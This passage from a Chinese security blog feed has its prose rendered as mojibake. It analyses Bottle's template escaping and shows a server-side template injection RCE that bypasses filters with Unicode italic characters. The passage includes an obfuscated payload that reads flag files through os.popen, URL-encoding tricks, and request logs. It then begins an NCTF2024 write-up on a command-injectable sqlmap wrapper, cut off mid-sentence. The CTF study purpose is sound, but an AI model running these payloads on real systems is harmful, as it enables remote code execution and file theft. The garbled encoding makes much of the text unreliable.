<span class="string">&#x27;_str&#x27;</span>: <span class="variable language_">self</span>._<span class="built_in">str</span>,</span><br><span class="line">            <span class="string">&#x27;_escape&#x27;</span>: <span class="variable language_">self</span>._escape,</span><br><span class="line">            <span class="string">&#x27;get&#x27;</span>: env.get,</span><br><span class="line">            <span class="string">&#x27;setdefault&#x27;</span>: env.setdefault,</span><br><span class="line">            <span class="string">&#x27;defined&#x27;</span>: env.__contains__</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬æ¥ç€çœ‹<code>flush_text</code>ï¼Œå…¶ä¸­æœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parts.append(self.process_inline(m.group(1).strip()))</span><br></pre></td></tr></table></figure><p>æ¯ä¸€è¡Œæ¨¡æ¿éƒ½ä¼šç»è¿‡å®ƒï¼Œ<code>self.process_inline(m.group(1).strip())</code>ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_inline</span>(<span class="params">chunk</span>):</span><br><span class="line">    <span class="keyword">if</span> chunk[<span class="number">0</span>] == <span class="string">&#x27;!&#x27;</span>: <span class="keyword">return</span> <span class="string">&#x27;_str(%s)&#x27;</span> % chunk[<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;_escape(%s)&#x27;</span> % chunk</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å‘ç°äº†ä¸è½¬ç æœ‰å…³çš„<code>_escape</code>å‡½æ•°ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥è·Ÿè¿›ä¸€ä¸‹ <code>self._escape</code>ï¼Œå‘ç°ä»–åœ¨prepareä¸­è¢«å®šä¹‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleTemplate</span>(<span class="title class_ inherited__">BaseTemplate</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">prepare</span>(<span class="params">self,</span></span><br><span class="line"><span class="params">                escape_func=html_escape,</span></span><br><span class="line"><span class="params">                noescape=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">                syntax=<span class="literal">None</span>, **ka</span>):</span><br><span class="line">        <span class="variable language_">self</span>.cache = &#123;&#125;</span><br><span class="line">        enc = <span class="variable language_">self</span>.encoding</span><br><span class="line">        <span class="variable language_">self</span>._<span class="built_in">str</span> = <span class="keyword">lambda</span> x: touni(x, enc)</span><br><span class="line">        <span class="variable language_">self</span>._escape = <span class="keyword">lambda</span> x: escape_func(touni(x, enc))</span><br><span class="line">        <span class="variable language_">self</span>.syntax = syntax</span><br><span class="line">        <span class="keyword">if</span> noescape:</span><br><span class="line">            <span class="variable language_">self</span>._<span class="built_in">str</span>, <span class="variable language_">self</span>._escape = <span class="variable language_">self</span>._escape, <span class="variable language_">self</span>._<span class="built_in">str</span></span><br></pre></td></tr></table></figure><p>è¿˜è®°å¾—æ¯ä¸€æ¬¡è¿›å…¥SimpleTemplateéƒ½æœ‰ä¸€æ¬¡åˆå§‹åŒ–å—ï¼Œå°±æ˜¯<code>prepare</code>å‡½æ•°è¿™äº›ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self._escape = lambda x: escape_func(touni(x, enc))</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹<code>escape_func</code>ï¼Œå‘ç°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escape_func=html_escape</span><br></pre></td></tr></table></figure><p>å†è·Ÿè¿›ä¸€ä¸‹<code>html_escape</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">html_escape</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Escape HTML special characters ``&amp;&lt;&gt;`` and quotes ``&#x27;&quot;``. &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> string.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)\</span><br><span class="line">                 .replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&amp;#039;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å°±æ˜¯ä¸€ä¸ªé˜²æ­¢XSSçš„HTMLç¼–ç å‡½æ•°ã€‚</p><p>è‡³æ­¤æˆ‘ä»¬å¾—å‡ºç»“è®ºï¼š<strong>æˆ‘ä»¬çš„è¾“å…¥ï¼Œä¸è®ºåœ¨ä¸åœ¨<code>&#123;&#123;&#125;&#125;</code>é‡Œï¼Œç»è¿‡å”¯ä¸€çš„ç¼–ç æ£€æŸ¥å°±æ˜¯å¯¹sourceçš„<code>touni()</code>ï¼Œä½†æ˜¯ç”±äºå…¨å±€å˜é‡ä¸­çš„unicodeåœ¨python3ä¸‹æ˜¯å…¨ä½“strï¼Œè¿™å°±å¯¼è‡´äº†æˆ‘ä»¬å¯ä»¥è¾“å…¥æ–œä½“å­—ç¬¦</strong></p><p>è¿™é‡Œç»™å‡ºä¸€ä¸ªæ–œä½“å­—ç¬¦ç”Ÿæˆå™¨ï¼š<a href="https://exotictext.com/zh-cn/italic/">https://exotictext.com/zh-cn/italic/</a></p><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408184735562.png" class="" title="This is an example image"><p>è¿™é‡Œ3.12.2åŠå…¶ä¹‹å‰çš„pythonç‰ˆæœ¬å¦‚æœæ‰§è¡Œä¸Šè¿°å‘½ä»¤ä¼šæŠ¥é”™ï¼</p><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408185439286.png" class="" title="This is an example image"><p>æœ€åçš„ä»£ç ç”±pythonçš„<code>exec()</code>æ¥æ‰§è¡Œ</p><p>å‡å¦‚ç›´æ¥<code>exec()</code>ä»»æ„codeçš„è¯ï¼Œpythonä¼šæŠŠcodeä¸­å½“ä½œä»£ç å¤„ç†çš„æ–œä½“å­—æ ¹æ®<code>Decomposition</code>è½¬æˆå¯¹åº”çš„ASCIIå­—ç¬¦ï¼ˆå½“ä½œå­—ç¬¦ä¸²å¤„ç†çš„é™¤å¤–ï¼Œå¦‚æ­¤ä¾‹ä¸­ï¼Œå‡å¦‚whoamiæˆ–osä¸ºæ–œä½“ï¼Œåˆ™ä¼šæ— æ³•æ‰§è¡Œï¼Œå› ä¸ºæ‰¾ä¸åˆ°æ–œä½“çš„osåº“ï¼Œå’Œæ–œä½“çš„whoamiå‘½ä»¤ï¼‰ï¼Œè¿™é‡Œ<code>os</code>å’Œ<code>whoami</code>æ˜¯å½“ä½œå­—ç¬¦ä¸²å¤„ç†çš„ï¼</p><p>çœ‹åˆ°è¿™é‡Œï¼Œæˆ‘æƒ³èµ·ä¹‹å‰ctfä¸€é“sstiçš„é¢˜ä¹Ÿè€ƒåˆ°äº†è¿™ç§æ–œä½“çš„æ–¹æ³•ï¼Œè¿™é‡Œç»™å‡ºä¸€ä¸ªpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(__ğ’Šğ’ğ’‘ğ’ğ’“ğ’•__(ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ğ’‚ğ’™(ğ’…ğ’Šğ’„ğ’•(ğ’‹ğ’ğ’Šğ’=())))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[106,111,105,110])))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[111, 115]))),ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ğ’‚ğ’™(ğ’…ğ’Šğ’„ğ’•(ğ’‹ğ’ğ’Šğ’=())))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[106,111,105,110])))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[112,111,112,101,110])))(ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ğ’‚ğ’™(ğ’…ğ’Šğ’„ğ’•(ğ’‹ğ’ğ’Šğ’=())))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[106,111,105,110])))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[99,97,116,32,47,102,42]))),ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ğ’‚ğ’™(ğ’…ğ’Šğ’„ğ’•(ğ’‹ğ’ğ’Šğ’=())))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[106,111,105,110])))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[114,101,97,100])))()</span><br></pre></td></tr></table></figure><p>ä»–è¿™ä¸ªå…¶å®æ˜¯ç­‰ä»·äº<code>__import__(&#39;os&#39;).popen(&#39;cat /f*&#39;).read()</code></p><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408190441433.png" class="" title="This is an example image"><p>æ¥ä¸‹æ¥å†è¯´è¯´ä¸ºä»€ä¹ˆåªæœ‰ä¸¤ä¸ªå­—ç¬¦<code>Âª</code> (U+00AA)ï¼Œ<code>Âº</code> (U+00BA)æˆåŠŸäº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Ã‚Âªbs(-1)&#125;&#125;</span><br><span class="line">127.0.0.1 - - [08/Apr/2025 19:06:12] &quot;GET /attack?payload=&#123;&#123;%C2%AAbs(-1)&#125;&#125; HTTP/1.1&quot; 400 752</span><br></pre></td></tr></table></figure><p>è¿™äº›ç‰¹æ®Šå­—ç¬¦ç»è¿‡URLç¼–ç ä¹‹åä¸€ä¸ªå­—ç¬¦éƒ½å¿…é¡»ä»¥ä¸¤ä¸ªç¼–ç å€¼è¡¨ç¤ºã€‚ä½†æ˜¯bottleåœ¨è§£æç¼–ç å€¼çš„æ—¶å€™æ˜¯æŒ‰ç…§ä¸€ä¸ªç¼–ç å€¼å¯¹åº”ä¸€ä¸ªå­—ç¬¦è¿›è¡Œè§£æçš„ï¼Œé‚£ä¹ˆbottleè§£æçš„å°±æ˜¯<code>%C2</code>,åªè¦åˆ é™¤æ‰<code>%C2</code>å°±èƒ½å°†å­—ç¬¦ä¼ å…¥åç«¯ï¼</p><p>æˆ‘ä»¬å†çœ‹çœ‹å…¶ä»–çš„æœ‰æ²¡æœ‰å¯åˆ©ç”¨çš„ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Ã‚Âªbs(-Ã‚Â¹)&#125;&#125;</span><br><span class="line">http://127.0.0.1:5000/attack?payload=&#123;&#123;%C2%AAbs(-%C2%B9)&#125;&#125;</span><br></pre></td></tr></table></figure><p>è‹¥æŠŠå‰é¢çš„<code>%C2</code>åˆ é™¤ï¼Œæˆ‘ä»¬ä¼ å…¥å¦‚ä¸‹çš„å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/attack?payload=&#123;&#123;%AAbs(%B9)&#125;&#125;</span><br></pre></td></tr></table></figure><p>æœåŠ¡ç«¯å›æ˜¾å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Âªbs(Â¹)&#125;&#125;</span><br><span class="line">127.0.0.1 - - [08/Apr/2025 19:12:10] &quot;GET /attack?payload=&#123;&#123;%AAbs(%B9)&#125;&#125; HTTP/1.1&quot; 400 750</span><br></pre></td></tr></table></figure><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408191231182.png" class="" title="This is an example image"><p>é‚£å°±æ˜¯ä¸è¡Œå–½ï¼</p><p>å…¶ä¸­åªæœ‰<code>Âª</code> (U+00AA)ï¼Œ<code>Âº</code> (U+00BA)ï¼Œ<code>Â¹</code> (U+00B9)ï¼Œ<code>Â²</code> (U+00B2)ï¼Œ<code>Â³</code> (U+00B3)æœ‰ç”¨ï¼Œå…¶ä¸­<code>Â¹</code> (U+00B9)ï¼Œ<code>Â²</code> (U+00B2)ï¼Œ<code>Â³</code> (U+00B3)åœ¨<code>exec()</code>æ—¶ä¸ä¼šè¢«pythonæ­£ç¡®è§£æã€‚è€Œ<code>Âª</code> (U+00AA)ï¼Œ<code>Âº</code> (U+00BA)æ‰§è¡Œçš„æ—¶å€™ç­‰æ•ˆäºå­—ç¬¦<code>a</code>,<code>o</code>ï¼Œåˆ«çš„å­—ç¬¦RCEæ ¹æœ¬ç”¨ä¸ä¸Šã€‚</p><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408191406445.png" class="" title="This is an example image"><p>è¿™é‡Œç¨å¾®æ€»ç»“ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æ˜¯ä»å‰ç«¯ä¼ å…¥çš„ï¼Œé‚£ä¹ˆä¸€å®šä¼šç»è¿‡urlç¼–ç ï¼Œä¸¾ä¸ªä¾‹å­ï¼š</p><p>æˆ‘ä»¬ä¼ å…¥çš„æ˜¯<code>&#123;&#123;ğ’¶ğ’·ğ“ˆ(1)&#125;&#125;</code>ï¼Œä½†æ˜¯åç«¯æ— æ³•å°†å…¶è§£æï¼Œå‰ç«¯é¡µé¢ä¼šæŠ¥é”™400ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [08/Apr/2025 19:15:16] &quot;GET /attack?payload=&#123;&#123;%F0%9D%92%B6%F0%9D%92%B7%F0%9D%93%88(1)&#125;&#125; HTTP/1.1&quot; 400 779</span><br><span class="line">&#123;&#123;Ã°ÂÂ’Â¶Ã°ÂÂ’Â·Ã°ÂÂ“Âˆ(1)&#125;&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç›´æ¥åœ¨åç«¯ä¼ å…¥<code>ğ’¶ğ’·ğ“ˆ(1)</code>ï¼Œå°†ä»¥ä¸‹è¯­å¥ç›´æ¥åŠ å…¥ä»£ç ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">return</span> bottle.template(<span class="string">&#x27;&#123;&#123;ğ’¶ğ’·ğ“ˆ(-2)&#125;&#125;&#x27;</span>)</span><br><span class="line">    <span class="comment"># payload = bottle.request.query.get(&#x27;payload&#x27;)</span></span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    <span class="comment"># try:</span></span><br><span class="line">    <span class="comment">#     return bottle.template(&#x27;hello &#x27;+payload)</span></span><br><span class="line">    <span class="comment"># except:</span></span><br><span class="line">    <span class="comment">#     bottle.abort(400, &#x27;Invalid payload&#x27;)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408191732187.png" class="" title="This is an example image"><p>æˆ‘ä»¬è®¿é—®æ—¶å‰ç«¯æ­£å¸¸å›æ˜¾ï¼</p><p>å†çœ‹çœ‹<code>Âª</code> (U+00AA)ï¼Œ<code>Âº</code> (U+00BA)ï¼Œå¦‚æœæˆ‘ä»¬å‰ç«¯ä¼ å…¥ï¼Œä»–ä¼šä»¥ä¸¤ä¸ªç¼–ç å€¼è¡¨ç¤ºï¼Œè€Œbottleåœ¨è§£æç¼–ç å€¼çš„æ—¶å€™æ˜¯æŒ‰ç…§ä¸€ä¸ªç¼–ç å€¼å¯¹åº”ä¸€ä¸ªå­—ç¬¦è¿›è¡Œè§£æçš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬ç›´æ¥ä¼ å…¥<code>Âª</code> (U+00AA)æˆ–è€…<code>Âº</code> (U+00BA)ï¼Œé‚£ä¹ˆå¿…ç„¶ä¹Ÿæ˜¯ä¼šæŠ¥é”™çš„ï¼Œå› æ­¤åœ¨å‰ç«¯ä¼ å…¥æ—¶éœ€è¦å°†å‰é¢çš„<code>%C2</code>åˆ é™¤åå†ä¼ å…¥ï¼</p><p>é‚£ä¹ˆå¦‚æœç›´æ¥ä»åç«¯ä¼ å…¥å‘¢ï¼Ÿçœ‹çœ‹æ•ˆæœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">return</span> bottle.template(<span class="string">&#x27;&#123;&#123;Âªbs(-1)&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408192016120.png" class="" title="This is an example image"><p>å› æ­¤æˆ‘ä»¬æ‰€æœ‰çš„é—®é¢˜éƒ½èšç„¦åœ¨å¦‚ä½•å°†æ–œä½“å­—ç¬¦ä¼ å…¥templateä¸­ã€‚</p><p>getï¼ˆpostï¼‰ä¼ å‚ç‰¹æ®Šå­—ç¬¦å¿…é¡»è¿›è¡ŒURLç¼–ç çš„åŸå› ï¼Œå› æ­¤æˆ‘ä»¬æ˜¯æ— æ³•ä¼ å…¥è¿™ç§æ–œä½“å­—ç¬¦çš„ã€‚ä½†æ˜¯å‡è®¾é¶æœºæä¾›äº†ä¸€ç§å¯ä»¥ä¸ä½¿ç”¨URLç¼–ç çš„æ–¹å¼å°†å¯æ§è¾“å…¥ä¼ å…¥templateï¼ˆå¦‚ï¼šä¸Šä¼ æ–‡ä»¶ï¼Œå†æ¸²æŸ“æ–‡ä»¶ä¸­çš„å†…å®¹å½¢æˆçš„SSTIï¼‰é‚£å°±æ„å‘³ç€æ‰€æœ‰çš„å­—ç¬¦å¯ä»¥å…¨éƒ¨ç”¨å„ç§æ–œä½“æ›¿æ¢ï¼ˆæ˜¯çš„ï¼Œä¸€ä¸ªASCIIçš„æ–œä½“å­—ç¬¦è‡³å°‘4ç§ï¼‰ï¼Œé‚£å°±çœŸçš„è¶…æ¨¡äº†ã€‚</p><p>å¯¹äºä»»æ„ASCIIå­—æ¯éƒ½è‡³å°‘å¯ä»¥åœ¨<a href="https://exotictext.com/zh-cn/italic/%E4%B8%8A%E6%89%BE%E5%88%B0%E5%9B%9B%E7%A7%8D%E5%AF%B9%E5%BA%94%E7%9A%84%E6%96%9C%E4%BD%93%E3%80%82%E5%9C%A8python%E4%B8%AD%E9%83%BD%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%BD%93%E6%88%90ASCII%E6%AD%A3%E5%B8%B8%E6%89%A7%E8%A1%8C%E3%80%82%E5%81%87%E8%AE%BE%E6%88%91%E4%BB%AC%E8%83%BD%E6%8A%8A%E8%BF%99%E4%BA%9B%E4%B8%9C%E8%A5%BF%E4%BC%A0%E5%88%B0%E5%90%8E%E7%AB%AF%EF%BC%8C%E4%B8%8D%E4%BC%9A%E8%A7%A6%E5%8F%91%E9%92%88%E5%AF%B9%E8%AF%A5%E5%AD%97%E7%AC%A6%E7%9A%84waf%EF%BC%8Cbottle%E6%B8%B2%E6%9F%93%E5%AE%8C%E6%88%90%E5%90%8E%E5%B0%B1%E4%BC%9A%E7%9B%B4%E6%8E%A5%E8%BF%9B%E5%85%A5exec%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%AD%A3%E5%B8%B8RCE%E3%80%82">https://exotictext.com/zh-cn/italic/ä¸Šæ‰¾åˆ°å››ç§å¯¹åº”çš„æ–œä½“ã€‚åœ¨pythonä¸­éƒ½å¯ä»¥ç›´æ¥å½“æˆASCIIæ­£å¸¸æ‰§è¡Œã€‚å‡è®¾æˆ‘ä»¬èƒ½æŠŠè¿™äº›ä¸œè¥¿ä¼ åˆ°åç«¯ï¼Œä¸ä¼šè§¦å‘é’ˆå¯¹è¯¥å­—ç¬¦çš„wafï¼Œbottleæ¸²æŸ“å®Œæˆåå°±ä¼šç›´æ¥è¿›å…¥execï¼Œå¯ä»¥æ­£å¸¸RCEã€‚</a></p><p>å‚è€ƒæ–‡ç« ï¼š</p><p>æ‹‰è’™ç‰¹å¾å®å­</p><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18805019">https://www.cnblogs.com/LAMENTXU/articles/18805019</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonæ¡†æ¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2024 web wp</title>
      <link href="/2025/04/07/NCTF2024-web-wp/"/>
      <url>/2025/04/07/NCTF2024-web-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="sqlmap-master"><a href="#sqlmap-master" class="headerlink" title="sqlmap-master"></a>sqlmap-master</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> FileResponse, StreamingResponse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> FileResponse(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">request: Request</span>):</span><br><span class="line">    data = <span class="keyword">await</span> request.json()</span><br><span class="line">    url = data.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;URL is required&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    command = <span class="string">f&#x27;sqlmap -u <span class="subst">&#123;url&#125;</span> --batch --flush-session&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            command.split(),</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            shell=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            output = process.stdout.readline()</span><br><span class="line">            <span class="keyword">if</span> output == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> process.poll() <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> output:</span><br><span class="line">                <span class="keyword">yield</span> output</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> StreamingResponse(generate(), media_type=<span class="string">&quot;text/plain&quot;</span>)</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªsqlmapçš„åˆ©ç”¨å™¨ï¼Œéšä¾¿è¾“ä¸ªurlå‘ç°ç‰ˆæœ¬æ˜¯æœ€æ–°ç‰ˆæœ¬1.9.3ã€‚</p><p>ç¬¬ä¸€çœ¼æˆ‘æƒ³åˆ°çš„æ˜¯é€šè¿‡<code>|</code>æˆ–è€…<code>&amp;</code>æˆ–è€…<code>;</code>æ¥è¿›è¡Œrceï¼Œä½†æ˜¯å‘ç°shell&#x3D;Falseï¼Œå› 